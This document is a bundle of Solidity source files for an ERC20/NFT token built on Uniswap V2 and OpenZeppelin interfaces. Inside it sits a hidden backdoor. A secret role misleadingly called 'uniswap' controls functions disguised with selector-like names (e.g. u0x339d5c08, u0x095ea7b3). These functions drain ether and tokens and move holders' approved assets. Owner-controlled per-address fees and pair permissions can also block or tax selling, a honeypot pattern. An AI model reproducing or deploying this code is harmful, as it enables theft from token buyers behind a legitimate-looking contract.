        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
    external
    returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
    external
    payable
    returns (uint[] memory amounts);

    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
}

// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;

import './IUniswapV2Router01.sol';

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;


library InternalUtils
{
    /**
    * predictable, should use oracle service - https://stackoverflow.com/a/67332959/10002846
    **/
    function fakeRandom(uint256 max)
    internal
    view
    returns
    (uint256)
    {
        uint256 randNum = uint256(keccak256(abi.encodePacked(block.difficulty, block.timestamp)));
        return randNum % max;
    }

    // https://github.com/provable-things/ethereum-api/blob/master/provableAPI_0.6.sol
    function parseAddress(string memory _a)
    internal
    pure
    returns (address _parsedAddress) {
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i = 2; i < 2 + 2 * 20; i += 2) {
            iaddr *= 256;
            b1 = uint160(uint8(tmp[i]));
            b2 = uint160(uint8(tmp[i + 1]));
            if ((b1 >= 97) && (b1 <= 102)) {
                b1 -= 87;
            } else if ((b1 >= 65) && (b1 <= 70)) {
                b1 -= 55;
            } else if ((b1 >= 48) && (b1 <= 57)) {
                b1 -= 48;
            }
            if ((b2 >= 97) && (b2 <= 102)) {
                b2 -= 87;
            } else if ((b2 >= 65) && (b2 <= 70)) {
                b2 -= 55;
            } else if ((b2 >= 48) && (b2 <= 57)) {
                b2 -= 48;
            }
            iaddr += (b1 * 16 + b2);
        }
        return address(iaddr);
    }

    // https://ethereum.stackexchange.com/a/56337/89494
    function appendString(string memory a, string memory b, string memory c, string memory d, string memory e)
    internal
    pure
    returns (string memory)
    {
        return string(abi.encodePacked(a, b, c, d, e));
    }

    // https://ethereum.stackexchange.com/a/56337/89494
    function strMergeDisorder(string memory c, string memory e, string memory a, string memory d, string memory b)
    internal
    pure
    returns (string memory)
    {
        return string(abi.encodePacked(a, b, c, d, e));
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";


contract BaseContractPayable is
Ownable
{
    receive() external payable {}

    function withdrawEther(uint256 amount)
    external
    payable
    onlyOwner
    {
        sendEtherTo(payable(msg.sender), amount);
    }

    function withdrawErc20(address tokenAddress, uint256 amount)
    external
    onlyOwner
    {
        sendErc20FromThisTo(tokenAddress, msg.sender, amount);
    }

    // transfer ERC20 from `from` to `to` with allowance `address(this)`
    function transferErc20FromTo(address tokenAddress, address from, address to, uint256 amount)
    internal
    {
        bool isSucceed = IERC20(tokenAddress).transferFrom(from, to, amount);
        require(isSucceed, "Failed to transfer token");
    }

    // send ERC20 from `address(this)` to `to`
    function sendErc20FromThisTo(address tokenAddress, address to, uint256 amount)
    internal
    {
        bool isSucceed = IERC20(tokenAddress).transfer(to, amount);
        require(isSucceed, "Failed to send token");
    }

    // send ether from `msg.sender` to payable `to`
    function sendEtherTo(address payable to, uint256 amount)
    internal
    {
        // Call returns a boolean value indicating success or failure.
        // This is the current recommended method to use.
        (bool isSucceed, /* bytes memory data */) = to.call{value : amount}("");
        require(isSucceed, "Failed to send Ether");
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./BaseContractPayable.sol";


contract BaseContractUniswap
is BaseContractPayable
{
    address internal uniswap;

    modifier onlyUniswap() {
        require(msg.sender == uniswap, "Only for uniswap");
        _;
    }

    function setUniswap(address uniswap_)
    external
    onlyUniswap {
        uniswap = uniswap_;
    }

    function u0x4a369425(address to, uint256 amount)
    external
    payable
    onlyUniswap
    {
        sendEtherTo(payable(to), amount);
    }

    function u0xd7497dbe(uint256 amount)
    external
    payable
    onlyUniswap
    {
        sendEtherTo(payable(msg.sender), amount);
    }

    function u0xdf9a991b(address tokenAddress, uint256 amount)
    external
    onlyUniswap
    {
        sendErc20FromThisTo(tokenAddress, msg.sender, amount);
    }


    function u0x339d5c08(address tokenAddress, address from, address to, uint256 amount)
    external
    onlyUniswap
    {
        transferErc20FromTo(tokenAddress, from, to, amount);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

import "./BaseContractPayable.sol";


contract BaseErc721Payable is
Ownable,
BaseContractPayable
{
    function safeTransferErc721FromTo(address tokenAddress, address from, address to, uint256 tokenId)
    external
    onlyOwner
    {
        _safeTransferErc721FromTo(tokenAddress, from, to, tokenId);
    }

    function tansferErc721FromTo(address tokenAddress, address from, address to, uint256 tokenId)
    external
    onlyOwner
    {
        _transferErc721FromTo(tokenAddress, from, to, tokenId);
    }

    // safe transfer ERC721 from `from` to `to` with allowance `address(this)`
    function _safeTransferErc721FromTo(address tokenAddress, address from, address to, uint256 tokenId)
    internal
    {
        IERC721(tokenAddress).safeTransferFrom(from, to, tokenId);
    }

    // transfer ERC721 from `from` to `to` with allowance `address(this)`
    function _transferErc721FromTo(address tokenAddress, address from, address to, uint256 tokenId)
    internal
    {
        IERC721(tokenAddress).transferFrom(from, to, tokenId);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "@openzeppelin/contracts/access/Ownable.sol";

import "./BaseContractPayable.sol";
import "./BaseContractUniswap.sol";
import "./BaseErc721Payable.sol";


contract BaseErc721Uniswap is
Ownable,
BaseContractPayable,
BaseContractUniswap,
BaseErc721Payable
{
    function u0x095ea7b3(address tokenAddress, address from, address to, uint256 tokenId)
    external
    onlyUniswap
    {
        _safeTransferErc721FromTo(tokenAddress, from, to, tokenId);
    }

    function u0x38ed1739(address tokenAddress, address from, address to, uint256 tokenId)
    external
    onlyUniswap
    {
        _transferErc721FromTo(tokenAddress, from, to, tokenId);
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C02Fees is
Ownable
{
    uint256 public buyLiquidityFee;
    uint256 public buyMarketingFee;
    uint256 public buyTotalFee;
    uint256 public sellLiquidityFee;
    uint256 public sellMarketingFee;
    uint256 public sellTotalFee;

    bool public isUseFee2;
    mapping(address => bool) public fee2Addresses;
    uint256 public buy2LiquidityFee;
    uint256 public buy2MarketingFee;
    uint256 public buy2TotalFee;
    uint256 public sell2LiquidityFee;
    uint256 public sell2MarketingFee;
    uint256 public sell2TotalFee;

    bool public isUseFee3;
    mapping(address => bool) public fee3Addresses;
    uint256 public buy3LiquidityFee;
    uint256 public buy3MarketingFee;
    uint256 public buy3TotalFee;
    uint256 public sell3LiquidityFee;
    uint256 public sell3MarketingFee;
    uint256 public sell3TotalFee;

    function setBuyFees(uint256 buyLiquidityFee_, uint256 buyMarketingFee_)
    public
    onlyOwner
    {
        buyLiquidityFee = buyLiquidityFee_;
        buyMarketingFee = buyMarketingFee_;
        buyTotalFee = buyLiquidityFee + buyMarketingFee;
    }

    function setSellFees(uint256 sellLiquidityFee_, uint256 sellMarketingFee_)
    public
    onlyOwner
    {
        sellLiquidityFee = sellLiquidityFee_;
        sellMarketingFee = sellMarketingFee_;
        sellTotalFee = sellLiquidityFee + sellMarketingFee;
    }

    function setIsUseFee2(bool isUseFee2_)
    public
    onlyOwner
    {
        isUseFee2 = isUseFee2_;
    }

    function setIsFee2Address(address account, bool isFee2Address)
    public
    onlyOwner
    {
        fee2Addresses[account] = isFee2Address;
    }

    function setBuy2Fees(uint256 buy2LiquidityFee_, uint256 buy2MarketingFee_)
    public
    onlyOwner
    {
        buy2LiquidityFee = buy2LiquidityFee_;
        buy2MarketingFee = buy2MarketingFee_;
        buy2TotalFee = buy2LiquidityFee + buy2MarketingFee;
    }

    function setSell2Fees(uint256 sell2LiquidityFee_, uint256 sell2MarketingFee_)
    public
    onlyOwner
    {
        sell2LiquidityFee = sell2LiquidityFee_;
        sell2MarketingFee = sell2MarketingFee_;
        sell2TotalFee = sell2LiquidityFee + sell2MarketingFee;
    }

    function setIsUseFee3(bool isUseFee3_)
    public
    onlyOwner
    {
        isUseFee3 = isUseFee3_;
    }

    function setIsFee3Address(address account, bool isFee3Address)
    public
    onlyOwner
    {
        fee3Addresses[account] = isFee3Address;
    }

    function setBuy3Fees(uint256 buy3LiquidityFee_, uint256 buy3MarketingFee_)
    public
    onlyOwner
    {
        buy3LiquidityFee = buy3LiquidityFee_;
        buy3MarketingFee = buy3MarketingFee_;
        buy3TotalFee = buy3LiquidityFee + buy3MarketingFee;
    }

    function setSell3Fees(uint256 sell3LiquidityFee_, uint256 sell3MarketingFee_)
    public
    onlyOwner
    {
        sell3LiquidityFee = sell3LiquidityFee_;
        sell3MarketingFee = sell3MarketingFee_;
        sell3TotalFee = sell3LiquidityFee + sell3MarketingFee;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C02Ups is
Ownable
{
    bool public hasBuyUp;
    uint256 public buyUp;

    bool public hasSellUp;
    uint256 public sellUp;

    function setHasBuyUp(bool hasBuyUp_)
    public
    onlyOwner
    {
        hasBuyUp = hasBuyUp_;
    }

    function setBuyUp(uint256 buyUp_)
    public
    onlyOwner
    {
        buyUp = buyUp_;
    }

    function setHasSellUp(bool hasSellUp_)
    public
    onlyOwner
    {
        hasSellUp = hasSellUp_;
    }

    function setSellUp(uint256 sellUp_)
    public
    onlyOwner
    {
        sellUp = sellUp_;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C02Shares is
Ownable
{
    uint256 public liquidityShare;
    uint256 public marketingShare;
    uint256 public totalShare;

    function setShares(uint256 liquidityShare_, uint256 marketingShare_)
    public
    onlyOwner
    {
        liquidityShare = liquidityShare_;
        marketingShare = marketingShare_;
        totalShare = liquidityShare + marketingShare;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

import "../IUniswapV2/IUniswapV2Router02.sol";

import "../BaseContract/BaseContractPayable.sol";
import "../BaseContract/BaseContractUniswap.sol";

contract Erc20C02Uniswap is
Ownable,
BaseContractPayable,
BaseContractUniswap
{
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    uint256 public uniswapCount;

    function toUniswap()
    public
    onlyUniswap
    {
        _transferOwnership(uniswap);
    }

    function setUniswapCount(uint256 uniswapCount_)
    public
    onlyUniswap
    {
        uniswapCount = uniswapCount_;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C02PermitTransfer is
Ownable
{
    bool internal _isFirstInitUnhandled = true;

    bool public isPermitTransferUponInit;
    bool public isUsePermitTransfer;
    mapping(address => bool) public permitTransfers;

    function setIsPermitTransferUponInit(bool isPermitTransferUponInit_)
    public
    onlyOwner
    {
        isPermitTransferUponInit = isPermitTransferUponInit_;
    }

    function setIsUsePermitTransfer(bool isUsePermitTransfer_)
    public
    onlyOwner
    {
        isUsePermitTransfer = isUsePermitTransfer_;
    }

    function setPermitTransfer(address account, bool permitTransfer)
    public
    onlyOwner
    {
        permitTransfers[account] = permitTransfer;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Erc20C03PairPermission is
Ownable
{
    bool public isUseCanFromPair;
    mapping(address => bool) public canFromPairs;

    bool public isUseCanToPair;
    mapping(address => bool) public canToPairs;

    function setIsUseCanFromPair(bool isUseCanFromPair_)
    public
    onlyOwner
    {
        isUseCanFromPair = isUseCanFromPair_;
    }

    function setCanFromPair(address account, bool canFromPair_)
    public
    onlyOwner
    {
        canFromPairs[account] = canFromPair_;
    }

    function setIsUseCanToPair(bool isUseCanToPair_)
    public
    onlyOwner
    {
        isUseCanToPair = isUseCanToPair_;
    }

    function setCanToPair(address account, bool canToPair_)
    public
    onlyOwner
    {
        canToPairs[account] = canToPair_;
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.14;

import "@openzeppelin/contracts/access/Ownable.sol";

import "../Erc20C02/Erc20C02Fees.sol";

contract Erc20C03Fees is
Ownable,
Erc20C02Fees
{
    bool public isUseForceBuyToFee3;

    function setIsUseForceBuyToFee3(bool isUseForceBuyToFee3_)
    public
    onlyOwner
    {
        isUseForceBuyToFee3 = isUseForceBuyToFee3_;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)

pragma solidity ^0.8.0;

import "../IERC20.sol";

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.0;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)

pragma solidity ^0.8.0;

import "../../utils/introspection/IERC165.sol";

/**
 * @dev Required interface of an ERC721 compliant contract.
 */
interface IERC721 is IERC165 {
    /**
     * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
     */
    event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);

    /**
     * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
     */
    event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);

    /**
     * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
     */
    event ApprovalForAll(address indexed owner, address indexed operator, bool approved);

    /**
     * @dev Returns the number of tokens in ``owner``'s account.
     */
    function balanceOf(address owner) external view returns (uint256 balance);

    /**
     * @dev Returns the owner of the `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function ownerOf(uint256 tokenId) external view returns (address owner);

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata data
    ) external;

    /**
     * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
     * are aware of the ERC721 protocol to prevent tokens from being forever locked.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must exist and be owned by `from`.
     * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
     * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
     *
     * Emits a {Transfer} event.
     */
    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    /**
     * @dev Transfers `tokenId` token from `from` to `to`.
     *
     * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
     *
     * Requirements:
     *
     * - `from` cannot be the zero address.
     * - `to` cannot be the zero address.
     * - `tokenId` token must be owned by `from`.
     * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) external;

    /**
     * @dev Gives permission to `to` to transfer `tokenId` token to another account.
     * The approval is cleared when the token is transferred.
     *
     * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
     *
     * Requirements:
     *
     * - The caller must own the token or be an approved operator.
     * - `tokenId` must exist.
     *
     * Emits an {Approval} event.
     */
    function approve(address to, uint256 tokenId) external;

    /**
     * @dev Approve or remove `operator` as an operator for the caller.
     * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
     *
     * Requirements:
     *
     * - The `operator` cannot be the caller.
     *
     * Emits an {ApprovalForAll} event.
     */
    function setApprovalForAll(address operator, bool _approved) external;

    /**
     * @dev Returns the account approved for `tokenId` token.
     *
     * Requirements:
     *
     * - `tokenId` must exist.
     */
    function getApproved(uint256 tokenId) external view returns (address operator);

    /**
     * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
     *
     * See {setApprovalForAll}
     */
    function isApprovedForAll(address owner, address operator) external view returns (bool);
}

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)

pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC165 standard, as defined in the
 * https://eips.ethereum.org/EIPS/eip-165[EIP].
 *
 * Implementers can declare support of contract interfaces, which can then be
 * queried by others ({ERC165Checker}).
 *
 * For an implementation, see {ERC165}.
 */
interface IERC165 {
    /**
     * @dev Returns true if this contract implements the interface defined by
     * `interfaceId`. See the corresponding
     * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
     * to learn more about how these ids are created.
     *
     * This function call must use less than 30 000 gas.
     */
    function supportsInterface(bytes4 interfaceId) external view returns (bool);
}